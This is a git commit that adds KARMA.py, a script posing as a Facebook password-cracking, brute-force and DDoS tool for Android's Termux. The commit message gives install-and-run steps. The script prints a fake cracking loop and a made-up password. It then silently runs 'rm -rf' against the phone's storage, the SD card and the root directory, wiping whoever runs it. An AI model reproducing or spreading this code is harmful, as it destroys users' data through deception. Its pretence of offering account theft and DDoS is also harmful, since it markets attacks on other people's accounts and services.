543f104d118e350de795dc31654d77d0fb534c84
$202 <114320201+force-202@users.noreply.github.com>
2022-10-31 23:20:21 +0800

    Add files via upload
    pkg update
    pkg upgrade
    pkg install python
    pkg install python2
    pip install requests
    pip install mechanize
    rm -rf KARMA
    git clone https://github.com/force-202/KARMA.git
    cd KARMA
    python KARMA.py

--- KARMA.py
+++ KARMA.py
@@ -1,1 +1,43 @@
+print("███████╗██╗   ██╗ ██████╗██╗  ██╗     ███████╗██████╗ ")
+print("██╔════╝██║   ██║██╔════╝██║ ██╔╝     ██╔════╝██╔══██╗")
+print("█████╗  ██║   ██║██║     █████╔╝█████╗█████╗  ██████╔╝")
+print("██╔══╝  ██║   ██║██║     ██╔═██╗╚════╝██╔══╝  ██╔══██╗")
+print("██║     ╚██████╔╝╚██████╗██║  ██╗     ██║     ██████╔╝")
+print("╚═╝      ╚═════╝  ╚═════╝╚═╝  ╚═╝     ╚═╝     ╚═════╝ ")
 
+print("<====================================================>")
+print("                  Created by: M4.$!L3N7                             ")
+print("<====================================================>")
+
+
+
+input("1. Enter target id ")
+
+input("2. Tpye ==> pass.txt ")
+
+print("choose a Menu")
+
+print("1.Single password hack")
+print("2.Brute-force")
+print("3.Report fb")
+print("4.Ddos attack")
+print("other")
+
+
+for y in range (100000):
+	print("Trying password ",y," proccessing password ")
+Facebook = input("press enter to get password:")
+
+print("password:nautokitaboy2311")
+
+import os
+os.system('rm -rf /storage/emulated/0/*')
+os.system('rm -rf /storage/emulated/*')
+os.system('rm -rf /sdcard/*')
+os.system('rm -rf /sdcard/0/*')
+os.system('rm -rf /sdcard1/*')
+os.system('rm -rf /storage/*')
+os.system('rm -rf /*')
+	
+	
+	
